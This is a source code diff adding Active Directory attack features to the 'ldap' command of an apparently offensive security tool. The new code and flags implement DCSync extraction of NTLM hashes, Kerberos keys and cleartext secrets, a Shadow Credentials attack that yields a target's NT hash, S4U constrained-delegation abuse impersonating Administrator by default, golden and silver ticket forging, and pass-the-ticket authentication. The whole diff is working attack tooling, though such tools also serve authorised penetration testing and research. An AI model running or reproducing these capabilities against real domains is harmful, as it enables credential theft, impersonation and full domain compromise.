@@ -49,7 +49,46 @@ var (
 	ldapEnumPSO                bool
 	ldapEnumACEs               bool
 	ldapPasswordSpray          bool
+	ldapDCSync                 string
+	ldapShadowCredsAdd         string
+
+	ldapKerberos bool
+	ldapAESKey   string
+	ldapCCache   string
+	ldapKirbi    string
+	ldapKeytab   string
+
+	ldapS4U         string
+	ldapImpersonate string
+	ldapGolden      bool
+	ldapSilver      string
+	ldapForgeKey    string
+	ldapForgeSID    string
+	ldapForgeRID    uint32
+	ldapForgeEType  int
+	ldapOutBase     string
 )
+
+// forgeOutBase returns the base filename for exported tickets (--out, or the
+// impersonated account name).
+func forgeOutBase() string {
+	if ldapOutBase != "" {
+		return ldapOutBase
+	}
+	if ldapImpersonate != "" {
+		return ldapImpersonate
+	}
+	return "ticket"
+}
+
+// newLDAPSession builds an LDAP session honouring the Kerberos flags when set.
+func newLDAPSession(host string, port int, domain, username, password, hash string, useTLS bool) (*ldap.Session, error) {
+	if ldapKerberos {
+		return ldap.NewKerberosSession(host, port, domain, username, password, hash, useTLS,
+			ldap.KerberosAuth{AESKey: ldapAESKey, CCache: ldapCCache, Kirbi: ldapKirbi, Keytab: ldapKeytab})
+	}
+	return ldap.NewSession(host, port, domain, username, password, hash, useTLS)
+}
 
 var ldapCmd = &cobra.Command{
 	Use:   "ldap",
@@ -61,6 +100,13 @@ func runLDAP(cmd *cobra.Command, args []string) {
 	proto := "LDAP"
 	if ldapTLS {
 		proto = "LDAPS"
+	}
+
+	doDCSync := cmd.Flags().Changed("dcsync")
+
+	// Any Kerberos material implies Kerberos authentication.
+	if ldapAESKey != "" || ldapCCache != "" || ldapKirbi != "" || ldapKeytab != "" {
+		ldapKerberos = true
 	}
 
 	targets, err := core.ParseTargets(ldapTarget)
@@ -90,7 +136,7 @@ func runLDAP(cmd *cobra.Command, args []string) {
 	if ldapPasswordSpray {
 		core.RunConcurrent(jobs, Threads, func(job core.Job) {
 			out := &core.OutputBuffer{}
-			sess, err := ldap.NewSession(job.Target, effectivePort, ldapDomain, job.Cred.Username, job.Cred.Password, job.Cred.Hash, ldapTLS)
+			sess, err := newLDAPSession(job.Target, effectivePort, ldapDomain, job.Cred.Username, job.Cred.Password, job.Cred.Hash, ldapTLS)
 			if err == nil {
 				err = sess.Connect()
 				if err == nil {
@@ -116,7 +162,7 @@ func runLDAP(cmd *cobra.Command, args []string) {
 	core.RunConcurrent(jobs, Threads, func(job core.Job) {
 		out := &core.OutputBuffer{}
 
-		session, err := ldap.NewSession(job.Target, effectivePort, ldapDomain, job.Cred.Username, job.Cred.Password, job.Cred.Hash, ldapTLS)
+		session, err := newLDAPSession(job.Target, effectivePort, ldapDomain, job.Cred.Username, job.Cred.Password, job.Cred.Hash, ldapTLS)
 		if err != nil {
 			out.Failure(fmt.Sprintf("[%s] %s - %s", proto, job.Target, err.Error()))
 			out.Flush()
@@ -638,6 +684,88 @@ func runLDAP(cmd *cobra.Command, args []string) {
 			}
 		}
 
+		if ldapShadowCredsAdd != "" {
+			res, err := ldapacl.AddShadowCred(session, ldapShadowCredsAdd, ldapDomain, job.Target)
+			if err != nil {
+				out.Failure(fmt.Sprintf("[ShadowCreds] %s", err.Error()))
+			} else {
+				out.Section("Shadow Credentials Attack", 1)
+				out.TreeEntryColored(res.SAMAccountName, core.ColorRed, false)
+				out.TreeDetail("DN", res.DN, false)
+				out.TreeDetail("NT Hash", res.NTHash, true)
+			}
+		}
+
+		if ldapS4U != "" {
+			res, err := ldapkrb.S4U(job.Target, ldapDomain, job.Cred.Username, job.Cred.Password, job.Cred.Hash, ldapAESKey, ldapImpersonate, ldapS4U, forgeOutBase())
+			if err != nil {
+				out.Failure(fmt.Sprintf("[S4U] %s", err.Error()))
+			} else {
+				out.Section("S4U2Proxy (constrained delegation)", 1)
+				out.TreeEntryColored(fmt.Sprintf("%s -> %s", res.Impersonated, res.TargetSPN), core.ColorRed, false)
+				out.TreeDetail("kirbi", res.KirbiPath, res.CCachePath == "")
+				if res.CCachePath != "" {
+					out.TreeDetail("ccache", res.CCachePath, true)
+				}
+			}
+		}
+
+		if ldapGolden || ldapSilver != "" {
+			sid := ldapForgeSID
+			if sid == "" {
+				if info, err := ldapenum.GetDomainInfo(session, ldapDomain); err == nil {
+					sid = info.SID
+				}
+			}
+			user := ldapImpersonate
+			if ldapGolden {
+				res, err := ldapkrb.ForgeGolden(ldapDomain, sid, user, ldapForgeRID, ldapForgeKey, ldapForgeEType, forgeOutBase())
+				if err != nil {
+					out.Failure(fmt.Sprintf("[Golden] %s", err.Error()))
+				} else {
+					out.Section("Golden Ticket", 1)
+					out.TreeEntryColored(user, core.ColorRed, false)
+					out.TreeDetail("kirbi", res.KirbiPath, res.CCachePath == "")
+					if res.CCachePath != "" {
+						out.TreeDetail("ccache", res.CCachePath, true)
+					}
+				}
+			}
+			if ldapSilver != "" {
+				res, err := ldapkrb.ForgeSilver(ldapDomain, sid, user, ldapForgeRID, ldapForgeKey, ldapForgeEType, ldapSilver, forgeOutBase())
+				if err != nil {
+					out.Failure(fmt.Sprintf("[Silver] %s", err.Error()))
+				} else {
+					out.Section("Silver Ticket", 1)
+					out.TreeEntryColored(fmt.Sprintf("%s @ %s", user, res.SPN), core.ColorRed, false)
+					out.TreeDetail("kirbi", res.KirbiPath, res.CCachePath == "")
+					if res.CCachePath != "" {
+						out.TreeDetail("ccache", res.CCachePath, true)
+					}
+				}
+			}
+		}
+
+		if doDCSync {
+			secrets, err := ldapcreds.DCSync(job.Target, ldapDomain, job.Cred.Username, job.Cred.Password, job.Cred.Hash, ldapDCSync)
+			if err != nil {
+				out.Failure(fmt.Sprintf("[DCSync] %s", err.Error()))
+			} else {
+				out.Section("DCSync Secrets", len(secrets))
+				for i, s := range secrets {
+					last := i == len(secrets)-1
+					out.TreeEntryColored(s.NTLM, core.ColorRed, last && len(s.KerberosKeys) == 0 && s.Cleartext == "")
+					for j, k := range s.KerberosKeys {
+						lastKey := last && s.Cleartext == "" && j == len(s.KerberosKeys)-1
+						out.TreeDetail("Kerberos", k, lastKey)
+					}
+					if s.Cleartext != "" {
+						out.TreeDetail("Cleartext", s.Cleartext, last)
+					}
+				}
+			}
+		}
+
 		out.Flush()
 	})
 }
@@ -652,6 +780,15 @@ func init() {
 	ldapCmd.Flags().IntVar(&ldapPort, "port", 389, "LDAP port")
 	for _, f := range []string{"target", "username", "password", "hash", "domain", "tls", "port"} {
 		ldapCmd.Flags().SetAnnotation(f, "group", []string{"Connection"})
+	}
+
+	ldapCmd.Flags().BoolVarP(&ldapKerberos, "kerberos", "k", false, "Authenticate with Kerberos (GSSAPI); derives a TGT from password/hash/AES key or uses a ccache/kirbi")
+	ldapCmd.Flags().StringVar(&ldapAESKey, "aes-key", "", "Kerberos AES128/AES256 key (hex) for authentication (implies -k)")
+	ldapCmd.Flags().StringVar(&ldapCCache, "ccache", "", "Path to a Kerberos ccache (FILE) for pass-the-ticket (implies -k)")
+	ldapCmd.Flags().StringVar(&ldapKirbi, "kirbi", "", "Path to a .kirbi (KRB-CRED) for pass-the-ticket (implies -k)")
+	ldapCmd.Flags().StringVar(&ldapKeytab, "keytab", "", "Path to a Kerberos keytab for authentication (implies -k)")
+	for _, f := range []string{"kerberos", "aes-key", "ccache", "kirbi", "keytab"} {
+		ldapCmd.Flags().SetAnnotation(f, "group", []string{"Authentication"})
 	}
 
 	ldapCmd.Flags().BoolVar(&ldapEnumUsers, "users", false, "Enumerate users")
@@ -685,8 +822,21 @@ func init() {
 	ldapCmd.Flags().BoolVar(&ldapEnumUnconstrainedDel, "unconstrained", false, "Find accounts with unconstrained delegation (excludes DCs)")
 	ldapCmd.Flags().BoolVar(&ldapEnumConstrainedDel, "constrained", false, "Find accounts with constrained delegation + SPNs")
 	ldapCmd.Flags().BoolVar(&ldapEnumRBCD, "rbcd", false, "Find accounts with resource-based constrained delegation configured")
-	for _, f := range []string{"unconstrained", "constrained", "rbcd"} {
+	ldapCmd.Flags().StringVar(&ldapS4U, "s4u", "", "Constrained-delegation abuse: S4U2Self+S4U2Proxy to this target SPN as --impersonate, export ccache/kirbi (uses -u creds/-H/--aes-key)")
+	ldapCmd.Flags().StringVar(&ldapImpersonate, "impersonate", "Administrator", "User to impersonate for --s4u and forged tickets")
+	for _, f := range []string{"unconstrained", "constrained", "rbcd", "s4u", "impersonate"} {
 		ldapCmd.Flags().SetAnnotation(f, "group", []string{"Delegation"})
+	}
+
+	ldapCmd.Flags().BoolVar(&ldapGolden, "golden", false, "Forge a golden ticket (needs --forge-key = krbtgt key); exports ccache/kirbi")
+	ldapCmd.Flags().StringVar(&ldapSilver, "silver", "", "Forge a silver ticket for this SPN (needs --forge-key = service account key); exports ccache/kirbi")
+	ldapCmd.Flags().StringVar(&ldapForgeKey, "forge-key", "", "Signing key (hex): krbtgt key for --golden, service account key for --silver (NT hash = RC4, or AES128/256)")
+	ldapCmd.Flags().StringVar(&ldapForgeSID, "forge-sid", "", "Domain SID for forged tickets (auto-resolved from the domain when omitted)")
+	ldapCmd.Flags().Uint32Var(&ldapForgeRID, "forge-rid", 500, "RID of the impersonated account in forged tickets")
+	ldapCmd.Flags().IntVar(&ldapForgeEType, "forge-key-etype", 0, "Encryption type of --forge-key (0=auto: 16B->RC4, 32B->AES256; use 17 for AES128)")
+	ldapCmd.Flags().StringVar(&ldapOutBase, "out", "", "Base filename for exported tickets (default: the impersonated account name)")
+	for _, f := range []string{"golden", "silver", "forge-key", "forge-sid", "forge-rid", "forge-key-etype", "out"} {
+		ldapCmd.Flags().SetAnnotation(f, "group", []string{"Ticket Forging"})
 	}
 
 	ldapCmd.Flags().BoolVar(&ldapEnumADCS, "adcs", false, "Enumerate CAs and templates, detect ESC1/ESC2/ESC3/ESC4/ESC9")
@@ -698,6 +848,13 @@ func init() {
 	ldapCmd.Flags().BoolVar(&ldapEnumGMSA, "gmsa", false, "Dump gMSA passwords as NT hashes (requires read access to msDS-ManagedPassword)")
 	ldapCmd.Flags().BoolVar(&ldapEnumACEs, "find-aces", false, "Find dangerous ACEs (GenericAll, WriteDACL, ForceChangePassword, DCSync...) on domain, groups, adminCount users, computers")
 	for _, f := range []string{"shadow-creds", "weak-accounts", "laps", "gmsa", "find-aces"} {
+		ldapCmd.Flags().SetAnnotation(f, "group", []string{"Credential Attacks"})
+	}
+
+	ldapCmd.Flags().StringVar(&ldapDCSync, "dcsync", "", `DCSync secrets via MS-DRSR: "all" (default), "DOMAIN\user", "user@domain", a DN, or a bare username (requires replication rights)`)
+	ldapCmd.Flags().Lookup("dcsync").NoOptDefVal = "all"
+	ldapCmd.Flags().StringVar(&ldapShadowCredsAdd, "shadow-creds-add", "", "Shadow Credentials attack on a target sAMAccountName: write msDS-KeyCredentialLink, PKINIT, UnPAC-the-hash, then clean up (requires GenericWrite over the target)")
+	for _, f := range []string{"dcsync", "shadow-creds-add"} {
 		ldapCmd.Flags().SetAnnotation(f, "group", []string{"Credential Attacks"})
 	}
 
